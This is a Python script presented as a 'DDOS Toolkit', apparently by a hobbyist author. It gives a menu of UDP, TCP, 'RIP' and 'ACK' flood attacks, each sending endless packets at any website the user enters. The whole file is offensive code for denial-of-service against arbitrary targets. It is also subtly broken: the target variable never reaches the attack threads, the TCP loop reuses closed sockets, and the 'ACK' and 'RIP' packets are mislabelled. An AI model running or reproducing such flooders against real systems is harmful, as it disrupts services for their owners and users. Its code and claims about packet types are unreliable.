import socket
import threading
from termcolor import colored

def menu():

  print(colored("DDOS Toolkit v1", 'magenta'))
  print(colored("Create by SkullzOS", 'white'))

  # Print the menu
  print("\n[*] Choose a DDoS attack method:")
  print("1. UDP flood")
  print("2. TCP flood")
  print("3. RIP attack")
  print("4. ACK flood")
  print("5. Exit\n")

  # Get the user's choice
  choice = input("Enter your choice (1-5): ")

  # Start the chosen attack method in a separate thread
  if choice == "1":
    TARGET_URL = input('Enter the website address (www.example.com):')
    udp_thread = threading.Thread(target=udp_flood)
    udp_thread.start()
  elif choice == "2":
    TARGET_URL = input('Enter the website address (www.example.com):')
    tcp_thread = threading.Thread(target=tcp_flood)
    tcp_thread.start()
  elif choice == "3":
    TARGET_URL = input('Enter the website address (www.example.com):')
    rip_thread = threading.Thread(target=rip_attack)
    rip_thread.start()
  elif choice == "4":
    TARGET_URL = input('Enter the website address (www.example.com):')
    ack_thread = threading.Thread(target=ack_flood)
    ack_thread.start()
  elif choice == "5":
    exit()
  else:
    print("Invalid choice. Try again.")
    menu()

def udp_flood():
  """
  Sends a flood of UDP packets to the target website.
  """
  while True:
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Set a timeout value
    sock.settimeout(0.5)
    # Send a large number of UDP packets to the target website
    for i in range(200):
      sock.sendto(f"UDP packet {i}".encode(), (TARGET_URL, 80))

def tcp_flood():
  """
  Sends a flood of TCP packets to the target website.
  """
  while True:
    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Set a timeout value
    sock.settimeout(0.5)
    # Send a large number of TCP packets to the target website
    for i in range(200):
      sock.connect((TARGET_URL, 80))
      sock.send(f"TCP packet {i}".encode())
      sock.close()

def rip_attack():
  """
  Sends a flood of RIP (Routing Information Protocol) packets to the target website.
  """
  while True:
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Set a timeout value
    sock.settimeout(0.5)
    # Send a large number of RIP packets to the target website
    for i in range(200):
      # Create a fake RIP packet
      packet = b"\x01\x00\x00\x00"  # RIP command and version
      packet += b"\x00\x02"  # Routing domain and address family
      packet += b"\x00\x00\x00\x00"  # Route tag
      packet += b"\x00\x00\x00\x00\x00\x00\x00\x00"  # IP address and subnet mask
      packet += b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Next hop and metric
      # Send the packet to the target website
      sock.sendto(packet, (TARGET_URL, 520))

def ack_flood():
  """
  Sends a flood of ACK packets to the target website.
  """
  while True:
    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Set a timeout value
    sock.settimeout(0.5)
    # Send a large number of ACK packets to the target website
    for i in range(200):
      sock.connect((TARGET_URL, 80))
      # Create a fake ACK packet
      packet = b"\x02\x00"  # ACK flag
      packet += b"\x00\x00\x00\x00"  # Sequence number
      packet += b"\x00\x00\x00\x00"  # Acknowledgment number
      packet += b"\x00\x00"  # TCP header length and flags
      packet += b"\xff\xff"  # Window size
      packet += b"\x00\x00"  # Checksum
      packet += b"\x00\x00"  # Urgent pointer
      # Send the packet to the target website
      sock.send(packet)
      sock.close()

if __name__ == "__main__":
  menu()
